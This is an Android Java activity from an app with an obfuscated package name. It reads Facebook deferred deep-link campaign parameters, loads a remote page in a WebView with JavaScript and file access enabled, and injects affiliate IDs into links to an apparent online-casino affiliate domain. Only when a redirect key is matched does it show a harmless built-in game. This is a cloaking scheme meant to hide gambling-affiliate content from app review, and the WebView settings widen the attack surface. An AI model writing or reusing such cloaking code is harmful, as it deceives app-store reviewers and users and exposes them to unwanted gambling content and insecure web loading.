package com.gjjrh.fjjwkja.frr;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.facebook.applinks.AppLinkData;

import com.gjjrh.fjjwkja.frr.kektus.PageMainGame;


public class PageDuplicate extends Activity {

    private String openedUrl;
    private String keyRedirect;
    private Uri uriLocal;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webgame);

        openedUrl = getString(R.string.opened_url);
        keyRedirect = getString(R.string.key_redirect);

        configParameters();
    }

    private void configParameters() {
        final Handler mainHandler = new Handler(Looper.getMainLooper());

        AppLinkData.fetchDeferredAppLinkData(this,
                appLinkData -> {
                    if (appLinkData != null) uriLocal = appLinkData.getTargetUri();
                    Runnable myRunnable = this::showWebView;
                    mainHandler.post(myRunnable);
                });
    }

    private String getTransformUrl(Uri data, String url) {
        String transform = url;

        String QUERY_1 = "cid";
        String QUERY_2 = "partid";

        if (data.getEncodedQuery().contains(QUERY_1)) {
            String queryValueFirst = data.getQueryParameter(QUERY_1);
            transform = transform.replace(QUERY_1, queryValueFirst);
        }
        if (data.getEncodedQuery().contains(QUERY_2)) {
            String queryValueSecond = data.getQueryParameter(QUERY_2);
            transform = transform.replace(QUERY_2, queryValueSecond);
        }
        return transform;
    }


    @SuppressLint("SetJavaScriptEnabled")
    private void showWebView() {
        WebView webView = findViewById(R.id.web_view);
        webView.setWebViewClient(new WebViewClient() {

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (!url.contains(keyRedirect)) {
                    if (url.contains("https://aff1b1b01.vulkanplat1num.net") && uriLocal != null) {
                        view.loadUrl(getTransformUrl(uriLocal, url));
                    } else {
                        view.loadUrl(url);
                    }
                } else {
                    openGame();
                }
                return true;
            }

        });
        WebSettings webSettings = webView.getSettings();
        webSettings.setBuiltInZoomControls(true);
        webSettings.setSupportZoom(true);
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
        webView.loadUrl(openedUrl);

    }

    private void openGame() {
        Intent intent = new Intent(this, PageMainGame.class);
        startActivity(intent);
        finish();
    }
}
